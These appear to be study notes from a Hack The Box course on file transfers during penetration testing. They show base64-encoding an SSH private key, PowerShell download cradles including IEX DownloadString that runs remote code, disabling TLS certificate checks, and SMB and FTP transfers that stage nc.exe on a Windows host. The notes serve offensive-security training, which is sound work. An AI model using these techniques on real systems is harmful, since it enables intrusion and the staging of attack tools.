![](https://academy.hackthebox.com/storage/modules/24/WIN-download-PwnBox.png)
==PowerShell Base64 Encode & Decode==

```
# Linux
Orbixio@htb[/htb]$ md5sum id_rsa
Orbixio@htb[/htb]$ cat id_rsa |base64 -w 0;echo    # Encode to base64

# Windows
PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<base64 hash goes here>"))
PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

==PowerShell Web Downloads==

|**Method**|**Description**|
|---|---|
|[OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)|Returns the data from a resource as a [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0).|
|[OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)|Returns the data from a resource without blocking the calling thread.|
|[DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)|Downloads data from a resource and returns a Byte array.|
|[DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)|Downloads data from a resource and returns a Byte array without blocking the calling thread.|
|[DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)|Downloads data from a resource to a local file.|
|[DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)|Downloads data from a resource to a local file without blocking the calling thread.|
|[DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)|Downloads a String from a resource and returns a String.|
|[DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0)|Downloads a String from a resource without blocking the calling thread.|

```
PS C:\htb> (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')

PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>', '<Output File Name>')

PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('<Target File URL>')

PS C:\htb> (New-Object Net.WebClient).DownloadString('<Target File URL>') | IEX

PS C:\htb> Invoke-WebRequest <Target File URL> -OutFile <Output File Name>
```

Harmj0y has compiled an extensive list of PowerShell download cradles [here](https://gist.github.com/HarmJ0y/bb48307ffa663256e239).

**Common Errors with PowerShell**

- ```powershell-session
Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.```

This can be bypassed using the parameter `-UseBasicParsing`.

- ```powershell-session
Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."```

This can be bypassed by following command:
`[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}`

==SMB Downloads==

```shell-session
Orbixio@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

```cmd-session
C:\htb> net use n: \\192.168.220.133\share /user:test test
```

```cmd-session
C:\htb> copy n:\nc.exe
```

==FTP Downloads==

```shell-session
Orbixio@htb[/htb]$ sudo python -m pyftpdlib --port 21
```

```powershell-session
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

#### Create a Command File for the FTP Client and Download the Target File

```cmd-session
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```


